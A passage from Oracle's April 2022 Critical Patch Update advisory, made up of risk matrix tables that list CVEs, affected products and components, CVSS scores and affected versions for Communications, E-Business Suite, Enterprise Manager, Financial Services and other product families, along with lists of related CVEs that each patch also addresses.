| CVE-2021-44832 | Oracle Communications EAGLE Element Management System | Platform (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 46.6 |  |
| CVE-2021-44832 | Oracle Communications EAGLE FTP Table Base Retrieval | Core (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 4.5 |  |
| CVE-2021-44832 | Oracle Communications Element Manager | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 9.0 |  |
| CVE-2021-44832 | Oracle Communications Evolved Communications Application Server | SDC,SCF (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.1 |  |
| CVE-2021-44832 | Oracle Communications Performance Intelligence Center (PIC) Software | Management (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 10.4.0.3 |  |
| CVE-2021-44832 | Oracle Communications Services Gatekeeper | OCSG common services - CORE (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.0.0.0.0 |  |
| CVE-2021-44832 | Oracle Communications Session Report Manager | General (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 9.0 |  |
| CVE-2021-44832 | Oracle Communications Session Route Manager | Third Party (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 9.0 |  |
| CVE-2021-44832 | Oracle Communications User Data Repository | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.4 |  |
| CVE-2021-44832 | Oracle Communications WebRTC Session Controller | Admin console, LWPR (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.2.1 |  |
| CVE-2021-43797 | Oracle Communications Cloud Native Core Binding Support Function | Policy (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 1.11.0 |  |
| CVE-2021-30129 | Oracle Communications Cloud Native Core Console | CNC Console (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 1.9.0 |  |
| CVE-2021-43797 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 1.8.0 |  |
| CVE-2021-43797 | Oracle Communications Cloud Native Core Policy | Policy (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 1.15.0 |  |
| CVE-2019-3799 | Oracle Communications Cloud Native Core Policy | Policy (Spring Cloud Config) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | 1.15.0 |  |
| CVE-2021-43797 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 1.7.0 |  |
| CVE-2021-43797 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 1.15.0 |  |
| CVE-2022-23437 | Oracle Communications Element Manager | Security (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | Prior to 9.0 |  |
| CVE-2022-23437 | Oracle Communications Session Report Manager | General (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | Prior to 9.0 |  |
| CVE-2022-23437 | Oracle Communications Session Route Manager | Third Party (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | Prior to 9.0 |  |
| CVE-2021-39140 | Oracle Communications Cloud Native Core Policy | Policy (XStream) | HTTP | No | 6.3 | Network | High | Low | None | Changed | None | None | High | 1.14.0 |  |
| CVE-2021-41184 | Oracle Communications Interactive Session Recorder | Dashboard (jQueryUI) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 6.4 |  |
| CVE-2021-41184 | Oracle Communications Operations Monitor | Mediation Engine (jQueryUI) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 4.3, 4.4, 5.0 |  |
| CVE-2021-2471 | Oracle Communications Cloud Native Core Console | CNC Console (MySQL Connectors) | HTTP | No | 5.9 | Network | High | High | None | Un- changed | High | None | High | 1.9.0 |  |
| CVE-2020-14340 | Oracle Communications Cloud Native Core Console | CNC Console (XNIO) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.9.0 |  |
| CVE-2020-1971 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (OpenSSL) | HTTPS | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.10.0 |  |
| CVE-2021-2471 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (MySQL) | TCP | No | 5.9 | Network | High | High | None | Un- changed | High | None | High | 1.8.0 |  |
| CVE-2021-21409 | Oracle Communications Cloud Native Core Policy | Policy (Netty) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | High | None | 1.14.0 |  |
| CVE-2021-38153 | Oracle Communications Cloud Native Core Policy | Policy (Apache Kafka) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 1.15.0 |  |
| CVE-2021-2471 | Oracle Communications Cloud Native Core Policy | Policy (MySQL) | HTTP | No | 5.9 | Network | High | High | None | Un- changed | High | None | High | 1.15.0 |  |
| CVE-2020-14340 | Oracle Communications Cloud Native Core Policy | Policy (XNIO) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-33880 | Oracle Communications Cloud Native Core Policy | Policy (aaugustin websockets) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 1.14.0 |  |
| CVE-2020-16135 | Oracle Communications Cloud Native Core Policy | Policy (libssh) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.15.0 |  |
| CVE-2021-2471 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (MySQL) | TCP | No | 5.9 | Network | High | High | None | Un- changed | High | None | High | 1.7.0 |  |
| CVE-2021-3572 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (python-pip) | HTTP | No | 5.7 | Network | Low | Low | Required | Un- changed | None | High | None | 1.10.0 |  |
| CVE-2021-3572 | Oracle Communications Cloud Native Core Policy | Policy (python-pip) | HTTP | No | 5.7 | Network | Low | Low | Required | Un- changed | None | High | None | 1.15.0 |  |
| CVE-2021-36374 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 1.9.0 |  |
| CVE-2021-36374 | Oracle Communications Cloud Native Core Binding Support Function | CNC BSF (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 1.11.0 |  |
| CVE-2021-22569 | Oracle Communications Cloud Native Core Console | CNC Console (protobuf-java) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 1.9.0 |  |
| CVE-2021-22569 | Oracle Communications Cloud Native Core Network Repository Function | OCNRF (protobuf-java) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 1.15.0, 1.15.1 |  |
| CVE-2020-13434 | Oracle Communications Cloud Native Core Policy | Policy (SQLite) | None | No | 5.5 | Local | Low | Low | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2020-15250 | Oracle Communications Cloud Native Core Policy | Policy (JUnit) | None | No | 5.5 | Local | Low | None | Required | Un- changed | High | None | None | 1.14.0 |  |
| CVE-2021-28168 | Oracle Communications Cloud Native Core Policy | Policy (Eclipse Jersey) | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 1.15.0 |  |
| CVE-2021-22569 | Oracle Communications Cloud Native Core Policy | Policy (protobuf-java) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 1.15.0 |  |
| CVE-2021-28168 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Eclipse Jersey) | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 1.15.0 |  |
| CVE-2021-36374 | Oracle Communications Diameter Intelligence Hub | Visualization (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2020-17521 | Oracle Communications Diameter Signaling Router | API Gateway (Apache Groovy) | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 8.4.0.0 |  |
| CVE-2022-20615 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite Framework (Jenkins Matrix Project) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 1.9.0 |  |
| CVE-2021-20289 | Oracle Communications Cloud Native Core Console | CNC Console (RESTEasy) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.9.0 |  |
| CVE-2020-14155 | Oracle Communications Cloud Native Core Policy | Policy (PCRE) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | 1.15.0 |  |
| CVE-2021-28169 | Oracle Communications Cloud Native Core Policy | Policy (Eclipse Jetty) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.14.0 |  |
| CVE-2021-28170 | Oracle Communications Cloud Native Core Policy | Policy (Jakarta) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 1.14.0 |  |
| CVE-2020-29582 | Oracle Communications Cloud Native Core Policy | Policy (Kotlin) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.14.0 |  |
| CVE-2020-8554 | Oracle Communications Cloud Native Core Policy | Policy (Kubernetes) | HTTP | No | 5.0 | Network | High | Low | None | Un- changed | Low | Low | Low | 1.15.0 |  |
| CVE-2021-22132 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite Framework (Elasticsearch) | HTTP | No | 4.8 | Network | High | Low | Required | Un- changed | High | None | None | 1.8.0 |  |
| CVE-2021-29425 | Oracle Communications Cloud Native Core Policy | Policy (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 1.14.0 |  |
| CVE-2021-29425 | Oracle Communications Diameter Intelligence Hub | Database (Apache Commons IO) | Oracle Net | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2021-29425 | Oracle Communications Policy Management | CMP (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.5.0.0.0 |  |
| CVE-2021-3521 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (rpm) | None | No | 4.4 | Local | High | Low | Required | Un- changed | None | High | None | 1.10.0 |  |
| CVE-2022-20613 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite (Jenkins Mailer) | HTTP | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | Low | None | 1.9.0 |  |
| CVE-2022-20612 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite Framework (Jenkins) | HTTP | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | Low | None | 1.9.0 |  |
| CVE-2021-22096 | Oracle Communications Cloud Native Core Console | CNC Console (Spring boot) | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | None | Low | None | 1.9.0 |  |
| CVE-2021-22096 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Spring Framework) | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | None | Low | None | 1.15.0 |  |
| CVE-2021-3200 | Oracle Communications Cloud Native Core Policy | Signaling (libsolv) | None | No | 3.3 | Local | Low | None | Required | Un- changed | None | None | Low | 1.15.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2017-1000353 also addresses CVE-2018-1000067, CVE-2018-1000068, CVE-2018-1000192, CVE-2018-1000193, CVE-2018-1000194, CVE-2018-1000195, CVE-2018-1999001, CVE-2018-1999002, CVE-2018-1999003, CVE-2018-1999004, CVE-2018-1999005, CVE-2018-1999007, CVE-2018-6356, CVE-2019-1003049, CVE-2019-1003050, CVE-2019-10383, and CVE-2019-10384.
* The patch for CVE-2019-16789 also addresses CVE-2019-16785, CVE-2019-16786, and CVE-2019-16792.
* The patch for CVE-2019-18276 also addresses CVE-2021-27568.
* The patch for CVE-2020-10878 also addresses CVE-2020-10543, and CVE-2020-12723.
* The patch for CVE-2020-13434 also addresses CVE-2020-15358.
* The patch for CVE-2020-35198 also addresses CVE-2020-28895.
* The patch for CVE-2020-36242 also addresses CVE-2020-25659.
* The patch for CVE-2020-8231 also addresses CVE-2020-8284, CVE-2020-8285, and CVE-2020-8286.
* The patch for CVE-2021-21409 also addresses CVE-2021-21295.
* The patch for CVE-2021-22132 also addresses CVE-2021-22134, CVE-2021-22144, and CVE-2021-22145.
* The patch for CVE-2021-22946 also addresses CVE-2021-22897, CVE-2021-22898, CVE-2021-22901, CVE-2021-22947, and CVE-2021-33560.
* The patch for CVE-2021-28169 also addresses CVE-2019-10247.
* The patch for CVE-2021-30468 also addresses CVE-2021-22696, and CVE-2021-40690.
* The patch for CVE-2021-32626 also addresses CVE-2021-32627, CVE-2021-32628, CVE-2021-32672, CVE-2021-32675, CVE-2021-32687, CVE-2021-32762, and CVE-2021-41099.
* The patch for CVE-2021-3518 also addresses CVE-2019-20388, CVE-2020-24977, CVE-2020-7595, CVE-2021-3517, and CVE-2021-3537.
* The patch for CVE-2021-35515 also addresses CVE-2021-35516, CVE-2021-35517, and CVE-2021-36090.
* The patch for CVE-2021-35574 also addresses CVE-2019-13750, CVE-2019-13751, CVE-2019-18218, CVE-2019-19603, CVE-2019-20838, CVE-2019-5827, CVE-2020-13435, CVE-2020-14155, CVE-2021-20231, CVE-2021-20232, CVE-2021-23840, CVE-2021-23841, CVE-2021-27645, CVE-2021-33574, CVE-2021-3445, CVE-2021-3580, CVE-2021-35942, CVE-2021-36084, CVE-2021-36085, CVE-2021-36086, and CVE-2021-36087.
* The patch for CVE-2021-3572 also addresses CVE-2019-20916.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516, and CVE-2021-35517.
* The patch for CVE-2021-36374 also addresses CVE-2021-36373.
* The patch for CVE-2021-3712 also addresses CVE-2021-3711.
* The patch for CVE-2021-39153 also addresses CVE-2021-39139, CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152, CVE-2021-39154, and CVE-2021-43859.
* The patch for CVE-2021-41184 also addresses CVE-2021-41182, and CVE-2021-41183.
* The patch for CVE-2021-44790 also addresses CVE-2021-44224.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.
* The patch for CVE-2022-20613 also addresses CVE-2022-20614.
* The patch for CVE-2022-22965 also addresses CVE-2022-22963.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Communications Cloud Native Core Policy
  + Policy (Apache Santuario XML Security For Java): CVE-2021-40690.
  + Policy (Spring Integration): CVE-2020-5413.
* Oracle Communications EAGLE Application Processor
  + Platform (Perl): CVE-2020-10878, CVE-2020-10543 and CVE-2020-12723.

#### Oracle Construction and Engineering Risk Matrix

This Critical Patch Update contains 3 new security patches for Oracle Construction and Engineering.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#PVA)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-23450 | Primavera Unifier | Platform (dojo) | HTTP | No | 7.6 | Network | Low | Low | None | Un- changed | Low | Low | High | 17.7-17.12, 18.8, 19.12, 20.12, 21.12 |  |
| CVE-2021-44832 | Instantis EnterpriseTrack | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 17.1, 17.2, 17.3 |  |
| CVE-2021-41184 | Primavera Unifier | User Interface (jQueryUI) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 17.7-17.12, 18.8, 19.12, 20.12, 21.12 |  |

#### Oracle E-Business Suite Risk Matrix

This Critical Patch Update contains 5 new security patches for Oracle E-Business Suite.  2 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#EBS)

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security updates are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the April 2022 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Release 12 Critical Patch Update Knowledge Document (April 2022), [My Oracle Support Note 2484000.1](https://support.oracle.com/rs?type=doc&id=2484000.1).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23305 | Oracle E-Business Suite Cloud Manager and Cloud Backup Module | Logging (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | EBS Cloud Manager and Backup Module: Prior to 22.1.1.1 |  |
| CVE-2021-44832 | Oracle E-Business Suite Information Discovery | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Enterprise Information Discovery: 7-9 | See Note 1 |
| CVE-2021-44832 | Oracle Enterprise Command Center Framework | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Enterprise Command Center: 7.0 | See Note 1 |
| CVE-2022-21468 | Oracle Applications Framework | Popups | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.4-12.2.11 |  |
| CVE-2022-21477 | Oracle Applications Framework | Attachments, File Upload | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 12.2.6-12.2.11 |  |

#### Notes:

1. Oracle E-Business Suite version is 12.2

#### Additional CVEs addressed are:

* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle Enterprise Manager Risk Matrix

This Critical Patch Update contains 10 new security patches for Oracle Enterprise Manager.  7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  None of these patches are applicable to client-only installations, i.e., installations that do not have Oracle Enterprise Manager installed. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#EM)

Oracle Enterprise Manager products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security updates are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the April 2022 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2844807.1](https://support.oracle.com/rs?type=doc&id=2844807.1 ) .

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23305 | Enterprise Manager Base Platform | Oracle Management Service (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 13.4.0.0, 13.5.0.0 |  |
| CVE-2018-1285 | Oracle Application Testing Suite | Load Testing for Web Apps (Apache log4net) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 13.3.0.1 |  |
| CVE-2021-40438 | Enterprise Manager Ops Center | User Interface (Apache HTTP Server) | HTTP | Yes | 9.0 | Network | High | None | None | Changed | High | High | High | 12.4.0.0 |  |
| CVE-2021-3518 | Enterprise Manager Base Platform | Enterprise Manager Install (libxml2) | HTTP | Yes | 8.8 | Network | Low | None | Required | Un- changed | High | High | High | 13.4.0.0, 13.5.0.0 |  |
| CVE-2021-2351 | Enterprise Manager Ops Center | Networking (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.4.0.0 |  |
| CVE-2021-3450 | Enterprise Manager for Storage Management | Privilege Management (OpenSSL) | HTTPS | Yes | 7.4 | Network | High | None | None | Un- changed | High | High | None | 13.4.0.0 |  |
| CVE-2021-44832 | Enterprise Manager Base Platform | Enterprise Manager Install (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 13.4.0.0, 13.5.0.0 |  |
| CVE-2021-44832 | Enterprise Manager for Peoplesoft | PSEM Plugin (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 13.4.1.1, 13.5.1.1 |  |
| CVE-2021-44832 | Enterprise Manager Ops Center | Networking (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.4.0.0 |  |
| CVE-2022-21469 | Enterprise Manager Base Platform | UI Framework | HTTP | Yes | 4.7 | Network | Low | None | Required | Changed | None | Low | None | 13.4.0.0, 13.5.0.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-3450 also addresses CVE-2020-1971, CVE-2021-23839, CVE-2021-23840, CVE-2021-23841, and CVE-2021-3449.
* The patch for CVE-2021-3518 also addresses CVE-2019-20388, CVE-2020-24977, CVE-2020-7595, CVE-2021-3517, and CVE-2021-3537.
* The patch for CVE-2021-40438 also addresses CVE-2021-44224, and CVE-2021-44790.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle Financial Services Applications Risk Matrix

This Critical Patch Update contains 41 new security patches for Oracle Financial Services Applications.  19 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#IFLX)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-22965 | Oracle Financial Services Analytical Applications Infrastructure | Others (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.1.1.0, 8.1.2.0 |  |
| CVE-2022-22965 | Oracle Financial Services Behavior Detection Platform | BD (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.1.1.0, 8.1.1.1, 8.1.2.0 |  |
| CVE-2022-22965 | Oracle Financial Services Enterprise Case Management | Installers (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.1.1.0, 8.1.1.1, 8.1.2.0 |  |
| CVE-2022-23305 | Oracle Financial Services Revenue Management and Billing | Infrastructure (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 2.7.0.0, 2.7.0.1, 2.8.0.0 |  |
| CVE-2021-2351 | Oracle Banking Enterprise Default Management | Collections (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 2.10.0, 2.12.0 |  |
| CVE-2021-2351 | Oracle Banking Platform | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 2.6.2, 2.7.1, 2.12.0 |  |
| CVE-2021-36090 | Oracle Banking Payments | Infrastructure (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-36090 | Oracle Banking Trade Finance | Infrastructure (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-37714 | Oracle Banking Trade Finance | Infrastructure (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-36090 | Oracle Banking Treasury Management | Infrastructure (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-37714 | Oracle Banking Treasury Management | Infrastructure (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-36090 | Oracle FLEXCUBE Universal Banking | Infrastructure (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.4, 14.0-14.3, 14.5 |  |
| CVE-2021-37714 | Oracle FLEXCUBE Universal Banking | Infrastructure (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 14.0-14.3, 14.5 |  |
| CVE-2021-44832 | Oracle Banking Deposits and Lines of Credit Servicing | Web UI (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 2.12.0 |  |
| CVE-2021-44832 | Oracle Banking Enterprise Default Management | Collections (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 2.7.1, 2.12.0 |  |
| CVE-2021-44832 | Oracle Banking Loans Servicing | Web UI (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 2.12.0 |  |
| CVE-2021-44832 | Oracle Banking Party Management | Web UI (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 2.7.0 |  |
| CVE-2021-44832 | Oracle Banking Payments | Infrastructure (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.5 |  |
| CVE-2021-44832 | Oracle Banking Platform | SECURITY (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 2.6.2, 2.7.1, 2.12.0 |  |
| CVE-2021-44832 | Oracle Banking Trade Finance | Infrastructure (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.5 |  |
| CVE-2021-44832 | Oracle Banking Treasury Management | Infrastructure (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.5 |  |
| CVE-2021-44832 | Oracle FLEXCUBE Universal Banking | Infrastructure (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 11.83.3, 12.1-12.4, 14.0-14.3, 14.5 |  |
| CVE-2021-30129 | Oracle Banking Payments | Infrastructure (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-30129 | Oracle Banking Trade Finance | Infrastructure (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-30129 | Oracle Banking Treasury Management | Infrastructure (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 14.5 |  |
| CVE-2022-23437 | Oracle Financial Services Analytical Applications Infrastructure | Others (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 8.0.6.0-8.0.9.0, 8.1.0.0-8.1.2.0 |  |
| CVE-2022-23437 | Oracle Financial Services Behavior Detection Platform | Third Party (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 8.0.6.0-8.0.8.0, 8.1.1.0, 8.1.1.1, 8.1.2.0 |  |
| CVE-2022-23437 | Oracle Financial Services Enterprise Case Management | Installers (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 8.0.7.1, 8.0.7.2, 8.0.8.0, 8.0.8.1, 8.1.1.0, 8.1.1.1 |  |
